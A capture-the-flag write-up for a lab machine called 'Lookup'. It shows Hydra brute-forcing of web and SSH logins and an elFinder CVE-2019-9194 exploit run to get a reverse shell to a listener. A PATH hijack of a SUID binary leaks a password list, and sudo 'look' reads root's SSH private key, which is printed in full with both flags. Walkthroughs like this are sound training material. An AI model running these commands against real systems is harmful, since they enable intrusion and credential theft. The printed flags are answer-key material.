# Lookup Writeup

> **Lookup** offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.

## Solution

First reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.128.149.92 -p-
```

From our result we found only two open ports 22 (SSH) and 80 (HTTP).
We know SSH  is hard to break so let's focus on HTTP.

We try entering the IP address into our browser, but the site redirects us to the domain `lookup.thm`. So we have to add it in our hosts file to access it.

```shell
nano /etc/hosts
```

```text
127.0.0.1       localhost
127.0.1.1       kali
10.128.149.92   lookup.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, upon reaching `lookup.thm`, a login page appears. And we notice from the error message that there is a user `admin`. So we try brute force the admin password.

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password. Please try again."
```

After waiting there is no response, it seems that the admin has a strong password.
So we have to find if there is another users.

```shell
hydra -L "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" -p "aaaaa" lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong username or password. Please try again."
```

```text
[80][http-post-form] host: lookup.thm   login: jose   password: aaaaa
```

We have found a user `jose` and now we hope that he uses a weak password so that we can brute force it.

```shell
hydra -l "jose" -P "/usr/share/wordlists/rockyou.txt" lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password. Please try again."
```

```text
[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

That's it a very easy password. Now let's login the web page using this credentials.
The login was successful and redirected us to a subdomain `files.lookup.thm`. We also have to add this subdomain to the hosts file.

```shell
nano /etc/hosts
```

```text
127.0.0.1       localhost
127.0.1.1       kali
10.128.149.92   lookup.thm      files.lookup.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

After resolving the address, I was greeted with the `elFinder` dashboard, all the files is locked and there is nothing interesting. But after navigated to the `About` page, where I discovered that the version in use was `2.1.47`.

Googling the version of `elFinder` we found there is an exploit `CVE-2019-9194`.
After searching we found a ready exploit on GitHub: https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce

```shell
python exploit.py -h
```

```text
usage: exploit.py [-h] -t <Target base URL> -lh <Listener IP> -lp <Listener Port>

CVE-2019-9194 elFinder 2.1.47 - PHP connector Command Injection

options:
  -h, --help            show this help message and exit
  -t <Target base URL>  Example: -t http://elfinder.url/elfinder/
  -lh <Listener IP>     Example: -lh 127.0.0.1
  -lp <Listener Port>   Example: -lp 1337
```

First we have to listen.

```shell
nc -lnvp 6666
```

```shell
python exploit.py -t http://files.lookup.thm/elFinder/ -lh 192.168.153.34 -lp 6666
```

And we successfully have a shell. And to make it better we use the commands:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

# ctrl Z
stty raw -echo ; fg ; reset
```

```shell
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now we have to find a way to escalate our privileges. Or enter another user.

Let's check the SUID binaries.

```shell
find / -perm -4000 -type f 2>/dev/null
```

There is a lot of thinks, but there is one new and suspicious binary.

```text
/usr/sbin/pwm
```

Let’s run it and see what it does.

```shell
/usr/sbin/pwm

[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

The executable is running the `id` command then extract the `User ID`, then read the file `.passwords` from the the user in the id.

Checking the users we found a user named `think` has the file `.passwords`.

So our plane is to create a file and name it `id` in the `/tmp` directory, then change the $PATH variable and add the `/tmp` directory to the first of the variable.

```shell
cd /tmp
```

```shell
echo "echo 'uid=33(think) gid=33(think) groups=33(think)'" > id
```

```shell
chmod +x id
```

```shell
export PATH=/tmp:$PATH
```

```shell
$PATH
bash: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory
```

Now let's run the `pwm` again.

```shell
/usr/sbin/pwm
```

```text
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

Now we have end from this session so we can exit it. And then try to use the passwords we found to enter as user `think` using SSH.

```shell
hydra -l think -P think_pass.txt lookup.thm ssh
```

```text
[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
```

```shell
ssh think@lookup.thm
josemario.AKA(think)
```

```shell
cat user.txt 
```

```text
38375fb4dd8baa2b2039ac03d92b820e
```

> What is the user flag?
> 
> 38375fb4dd8baa2b2039ac03d92b820e

Now the rest is to find the root flag.

```shell
sudo -l
```

```text
(ALL) /usr/bin/look
```

We can run the look command as root, so we can read any file we want.

```shell
sudo look '' /root/.ssh/id_rsa
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR
Qcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfROfU0pnR
j7eIpw50J7PGPNG7RAgbP5tJ2NcsFYAifmxMrJPVR/+ybAIVbB+ya/D5r9DYPmatUTLlHD
bV55xi6YcfV7rjbOpjRj8hgubYgjL26BwszbaHKSkI+NcVNPmgquy5Xw8gh3XciFhNLqmd
ISF9fxn5i1vQDB318owoPPZB1rIuMPH3C0SIno42FiqFO/fb1/wPHGasBmLzZF6Fr8/EHC
4wRj9tqsMZfD8xkk2FACtmAFH90ZHXg5D+pwujPDQAuULODP8Koj4vaMKu2CgH3+8I3xRM
hufqHa1+Qe3Hu++7qISEWFHgzpRMFtjPFJEGRzzh2x8F+wozctvn3tcHRv321W5WJGgzhd
k5ECnuu8Jzpg25PEPKrvYf+lMUQebQSncpcrffr9AAAFiJB/j92Qf4/dAAAAB3NzaC1yc2
EAAAGBAKbZtvg4qVX1DGPu4PS3Jn/4dt0wh+6ikYOD3p5bYvUSltly0gecEUHKstc0RQyr
UUBoX06vmH1X26CQTwnyh3aUKjP8w2//2ZZ5cAsCkOV8k0FP7x30Tn1NKZ0Y+3iKcOdCez
xjzRu0QIGz+bSdjXLBWAIn5sTKyT1Uf/smwCFWwfsmvw+a/Q2D5mrVEy5Rw21eecYumHH1
e642zqY0Y/IYLm2IIy9ugcLM22hykpCPjXFTT5oKrsuV8PIId13IhYTS6pnSEhfX8Z+Ytb
0Awd9fKMKDz2QdayLjDx9wtEiJ6ONhYqhTv329f8DxxmrAZi82Reha/PxBwuMEY/barDGX
w/MZJNhQArZgBR/dGR14OQ/qcLozw0ALlCzgz/CqI+L2jCrtgoB9/vCN8UTIbn6h2tfkHt
x7vvu6iEhFhR4M6UTBbYzxSRBkc84dsfBfsKM3Lb597XB0b99tVuViRoM4XZORAp7rvCc6
YNuTxDyq72H/pTFEHm0Ep3KXK336/QAAAAMBAAEAAAGBAJ4t2wO6G/eMyIFZL1Vw6QP7Vx
zdbJE0+AUZmIzCkK9MP0zJSQrDz6xy8VeKi0e2huIr0Oc1G7kA+QtgpD4G+pvVXalJoTLl
+K9qU2lstleJ4cTSdhwMx/iMlb4EuCsP/HeSFGktKH9yRJFyQXIUx8uaNshcca/xnBUTrf
05QH6a1G44znuJ8QvGF0UC2htYkpB2N7ZF6GppUybXeNQi6PnUKPfYT5shBc3bDssXi5GX
Nn3QgK/GHu6NKQ8cLaXwefRUD6NBOERQtwTwQtQN+n/xIs77kmvCyYOxzyzgWoS2zkhXUz
YZyzk8d2PahjPmWcGW3j3AU3A3ncHd7ga8K9zdyoyp6nCF+VF96DpZSpS2Oca3T8yltaR1
1fkofhBy75ijNQTXUHhAwuDaN5/zGfO+HS6iQ1YWYiXVZzPsktV4kFpKkUMklC9VjlFjPi
t1zMCGVDXu2qgfoxwsxRwknKUt75osVPN9HNAU3LVqviencqvNkyPX9WXpb+z7GUf7FQAA
AMEAytl5PGb1fSnUYB2Q+GKyEk/SGmRdzV07LiF9FgHMCsEJEenk6rArffc2FaltHYQ/Hz
w/GnQakUjYQTNnUIUqcxC59SvbfAKf6nbpYHzjmWxXnOvkoJ7cYZ/sYo5y2Ynt2QcjeFxn
vD9I8ACJBVQ8LYUffvuQUHYTTkQO1TnptZeWX7IQml0SgvucgXdLekMNu6aqIh71AoZYCj
rirB3Y5jjhhzwgIK7GNQ7oUe9GsErmZjD4c4KueznC5r+tQXu3AAAAwQDWGTkRzOeKRxE/
C6vFoWfAj3PbqlUmS6clPOYg3Mi3PTf3HyooQiSC2T7pK82NBDUQjicTSsZcvVK38vKm06
K6fle+0TgQyUjQWJjJCdHwhqph//UKYoycotdP+nBin4x988i1W3lPXzP3vNdFEn5nXd10
5qIRkVl1JvJEvrjOd+0N2yYpQOE3Qura055oA59h7u+PnptyCh5Y8g7O+yfLdw3TzZlR5T
DJC9mqI25np/PtAKNBEuDGDGmOnzdU47sAAADBAMeBRAhIS+rM/ZuxZL54t/YL3UwEuQis
sJP2G3w1YK7270zGWmm1LlbavbIX4k0u/V1VIjZnWWimncpl+Lhj8qeqwdoAsCv1IHjfVF
dhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL
3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

That's it now we can copy the `id_rsa` of the root and use it to enter with SSH.

```shell
chmod 600 id_rsa
```

```shell
ssh root@lookup.thm -i id_rsa
```

```shell
whoami
root
```

```shell
cat /root/root.txt
```

```text
5a285a9f257e45c68bb6c9f9f57d18e8
```

> What is the root flag?
> 
> 5a285a9f257e45c68bb6c9f9f57d18e8

